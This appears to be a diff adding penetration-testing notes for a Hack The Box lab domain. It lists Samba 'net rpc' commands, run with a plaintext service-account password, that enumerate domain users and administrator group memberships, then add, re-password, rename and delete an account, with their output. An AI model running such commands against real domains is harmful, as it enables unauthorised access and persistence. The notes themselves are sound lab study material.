@@ -1,0 +1,77 @@
+## rpc
+### info
+```sh
+└─$ net rpc info -U 'htb.local/svc-alfresco%s3rvice' -S 10.129.95.210
+Domain Name: HTB
+Domain SID: S-1-5-21-3072663084-364016917-1341370565
+Sequence number: 1
+Num users: 105
+Num domain groups: 0
+Num local groups: 0
+```
+
+### user
+```sh
+└─$ net rpc user -U 'htb.local/svc-alfresco%s3rvice' -S 10.129.95.210
+$331000-VK4ADACQNUCA
+Administrator
+andy
+DefaultAccount
+Guest
+HealthMailbox0659cc1
+HealthMailbox670628e
+HealthMailbox6ded678
+HealthMailbox7108a4e
+HealthMailbox83d6781
+HealthMailbox968e74d
+HealthMailboxb01ac64
+HealthMailboxc0a90c9
+HealthMailboxc3d7722
+HealthMailboxfc9daad
+HealthMailboxfd87238
+krbtgt
+lucinda
+mark
+santi
+sebastien
+SM_1b41c9286325456bb
+SM_1ffab36a2f5f479cb
+SM_2c8eef0a09b545acb
+SM_681f53d4942840e18
+SM_75a538d3025e4db9a
+SM_7c96b981967141ebb
+SM_9b69f1b9d2cc45549
+SM_c75ee099d0a64c91b
+SM_ca8c2ed5bdab4dc9b
+svc-alfresco
+```
+#### user info
+```sh
+└─$ net rpc user info administrator -U 'htb.local/svc-alfresco%s3rvice' -S 10.129.95.210
+Enterprise Admins
+Organization Management
+Domain Users
+Group Policy Creator Owners
+Domain Admins
+Schema Admins
+```
+#### user add
+```sh
+└─$ net rpc user add user user123$ -U 'htb.local/svc-alfresco%s3rvice' -S 10.129.95.210
+Added user 'user'.
+```
+#### user password
+```sh
+└─$ net rpc user password user user123% -U 'htb.local/svc-alfresco%s3rvice' -S 10.129.95.210
+
+```
+#### user rename
+```sh
+└─$ net rpc user rename user user1  -U 'htb.local/svc-alfresco%s3rvice' -S 10.129.95.210
+Renamed user from user to user1
+```
+#### user delete
+```sh
+└─$ net rpc user delete user -U 'htb.local/svc-alfresco%s3rvice' -S 10.129.95.210
+Deleted user 'user'.
+```
